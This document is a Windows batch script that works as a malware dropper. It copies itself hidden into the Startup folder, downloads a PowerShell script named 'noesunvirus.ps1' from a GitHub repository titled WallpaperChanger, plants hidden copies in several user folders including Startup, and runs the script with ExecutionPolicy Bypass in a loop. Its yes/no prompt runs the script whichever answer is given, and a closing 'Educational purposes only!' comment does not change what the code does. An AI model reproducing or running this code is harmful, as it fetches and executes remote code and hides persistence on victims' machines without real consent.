@echo off
setlocal enabledelayedexpansion
powershell -WindowStyle Hidden -Command ""

set scriptURL=https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/noesunvirus.ps1
set scriptPath1=%userprofile%\Downloads\noesunvirus.ps1
set scriptPath2=%userprofile%\Documents\noesunvirus.ps1
set scriptPath3=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1
set batchPath=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat

if not exist "%batchPath%" (
    copy "%~f0" "%batchPath%"
    attrib +h +s "%batchPath%"
)

:checkloop

if not exist "%scriptPath1%" (
    powershell -Command "Invoke-WebRequest -Uri '%scriptURL%' -OutFile '%scriptPath1%' 2>&1" || (
        echo Failed to download script
        pause
        exit /b 1
    )
    attrib +h +s "%scriptPath1%"
)

if not exist "%scriptPath2%" (
    copy "%scriptPath1%" "%scriptPath2%"
    attrib +h +s "%scriptPath2%"
)

if not exist "%scriptPath3%" (
    copy "%scriptPath1%" "%scriptPath3%"
    attrib +h +s "%scriptPath3%"
)

timeout /t 10 >nul

choice /m "Do you want to execute the PowerShell script now?" /c YN
if errorlevel 1 powershell -ExecutionPolicy Bypass -File "%scriptPath1%"

goto checkloop

:: Educational purposes only!
